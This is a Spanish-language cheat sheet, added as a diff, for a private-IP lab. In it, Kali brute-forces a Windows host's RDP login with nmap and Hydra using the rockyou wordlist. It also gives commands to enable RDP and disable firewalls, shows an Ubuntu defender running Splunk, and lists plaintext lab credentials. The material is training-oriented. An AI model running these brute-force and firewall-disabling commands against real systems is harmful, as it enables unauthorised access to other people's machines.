@@ -1,0 +1,186 @@
+┌─────────────────────────────────────────────────────────────────┐
+│                        COMANDOS EN KALI                         │
+└─────────────────────────────────────────────────────────────────┘
+
+# --- VER IP Y CONECTIVIDAD ----------------------------------------
+
+# Ver IP de Kali
+ip a
+ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+
+# Hacer ping a Windows y Ubuntu
+ping 192.168.1.106   # Windows víctima
+ping 192.168.1.105   # Ubuntu defensor
+
+# --- ESCANEO DE PUERTOS -------------------------------------------
+
+# Escanear puerto RDP en Windows
+nmap -p 3389 192.168.1.106
+
+# Escanear todo el rango en busca de puerto 3389
+nmap -p 3389 192.168.1.0/24
+
+# --- ATAQUE HYDRA ------------------------------------------------
+
+# Verificar que Hydra está instalado
+which hydra
+
+# Descomprimir diccionario rockyou.txt
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Copiar diccionario a home (evitar permisos)
+cp /usr/share/wordlists/rockyou.txt ~/
+
+# ATAQUE: Con contraseña específica (prueba rápida)
+hydra -l victima -p 22675439 rdp://192.168.1.106
+
+# ATAQUE: Con todo el diccionario rockyou.txt
+hydra -l victima -P ~/rockyou.txt -t 1 -W 3 rdp://192.168.1.106
+
+# ATAQUE: Con diccionario personalizado pequeño
+hydra -l victima -P ~/prueba.txt rdp://192.168.1.106
+
+# --- CONEXIÓN RDP -------------------------------------------------
+
+# Con xfreerdp3 (recomendado)
+xfreerdp3 /v:192.168.1.106 /u:victima /p:22675439 /cert:ignore
+
+# Con xfreerdp3 en modo ventana redimensionable
+xfreerdp3 /v:192.168.1.106 /u:victima /p:22675439 /cert:ignore /dynamic-resolution /floatbar
+
+# Con rdesktop (alternativa)
+rdesktop 192.168.1.106
+
+# --- SCRIPT VENTANA REBELDE ---------------------------------------
+
+# Ejecutar desde Kali (si el script está en Kali)
+python3 ~/Desktop/mis_scripts/ventana_rebelde.py
+
+# --- INSTALACIÓN DE HERRAMIENTAS -----------------------------------
+
+# Instalar freerdp (cliente RDP moderno)
+sudo apt install freerdp3-x11 -y
+
+# Instalar hydra (si no está)
+sudo apt install hydra -y
+
+# Instalar nmap (si no está)
+sudo apt install nmap -y
+
+┌─────────────────────────────────────────────────────────────────┐
+│                       COMANDOS EN WINDOWS                       │
+└─────────────────────────────────────────────────────────────────┘
+
+# --- VER IP Y CONFIGURACIÓN ---------------------------------------
+
+# Ver IP de Windows (CMD)
+ipconfig
+
+# Ver nombre de usuario
+whoami
+
+# --- HABILITAR RDP ------------------------------------------------
+
+# Habilitar escritorio remoto (CMD como administrador)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# --- DESBLOQUEAR USUARIO ------------------------------------------
+
+# Activar cuenta de usuario
+net user victima /active:yes
+
+# Ver estado de la cuenta
+net user victima
+
+# --- FIREWALL -----------------------------------------------------
+
+# Desactivar firewall (para el laboratorio)
+netsh advfirewall set allprofiles state off
+
+# Activar firewall
+netsh advfirewall set allprofiles state on
+
+# Abrir puerto RDP en firewall
+netsh advfirewall firewall add rule name="RDP" dir=in protocol=tcp localport=3389 action=allow
+
+# --- EJECUTAR SCRIPT ----------------------------------------------
+
+# Si Python está instalado
+python ventana_rebelde.py
+
+# Si Python no está instalado, descargar desde:
+# https://www.python.org/downloads/
+
+┌─────────────────────────────────────────────────────────────────┐
+│                       COMANDOS EN UBUNTU                        │
+└─────────────────────────────────────────────────────────────────┘
+
+# --- VER IP Y ACTUALIZAR ------------------------------------------
+
+# Ver IP de Ubuntu
+ip a
+hostname -I
+
+# Actualizar sistema
+sudo apt update && sudo apt upgrade -y
+
+# --- INSTALAR SPLUNK (opcional) -----------------------------------
+
+# Descargar Splunk (reemplazar versión)
+wget -O splunk.deb "https://download.splunk.com/products/splunk/releases/9.4.1/linux/splunk-9.4.1-2c0e7b093587-linux-2.6-amd64.deb"
+
+# Instalar Splunk
+sudo dpkg -i splunk.deb
+
+# Iniciar Splunk
+sudo /opt/splunk/bin/splunk start --accept-license
+
+# --- FIREWALL -----------------------------------------------------
+
+# Abrir puertos para Splunk
+sudo ufw allow 8000/tcp
+sudo ufw allow 9997/tcp
+
+# Desactivar firewall (opcional)
+sudo ufw disable
+
+┌─────────────────────────────────────────────────────────────────┐
+│                    SOLUCIÓN DE ERRORES COMUNES                  │
+└─────────────────────────────────────────────────────────────────┘
+
+# ERROR: "File for passwords not found" en Hydra
+# SOLUCIÓN: Usar -P mayúscula y verificar ruta
+hydra -l victima -P /ruta/correcta/rockyou.txt rdp://IP
+
+# ERROR: "all children were disabled" en Hydra
+# SOLUCIÓN: Reducir tareas y añadir espera
+hydra -l victima -P diccionario.txt -t 1 -W 3 rdp://IP
+
+# ERROR: "ERRCONNECT_ACCOUNT_LOCKED_OUT" en RDP
+# SOLUCIÓN: Desbloquear usuario en Windows
+net user victima /active:yes
+
+# ERROR: "Failed to initialize NLA" en rdesktop
+# SOLUCIÓN: Usar xfreerdp3 o desactivar NLA en Windows
+
+# ERROR: "Permission denied" al copiar rockyou.txt
+# SOLUCIÓN: Usar sudo
+sudo cp /usr/share/wordlists/rockyou.txt ~/
+
+┌─────────────────────────────────────────────────────────────────┐
+│                      REFERENCIAS RÁPIDAS                        │
+└─────────────────────────────────────────────────────────────────┘
+
+# IPs del laboratorio (ejemplo)
+# Kali:     192.168.1.104
+# Ubuntu:   192.168.1.105
+# Windows:  192.168.1.106
+
+# Credenciales
+# Kali:     kali / kali
+# Windows:  victima / 22675439
+# Ubuntu:   defensor / 123456
+
+# Puertos importantes
+# RDP:      3389 (Windows)
+# Splunk:   8000 (web), 9997 (recepción de logs)
